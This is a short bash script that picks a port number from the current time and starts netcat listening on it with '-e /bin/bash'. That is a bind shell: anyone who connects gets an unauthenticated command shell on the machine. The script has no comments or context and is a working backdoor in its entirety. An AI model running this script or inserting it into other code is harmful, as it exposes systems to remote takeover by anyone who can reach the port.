#! /bin/bash
portnum=$(date +%s%N|cut -c11-16)
nc -l -p $portnum -e /bin/bash
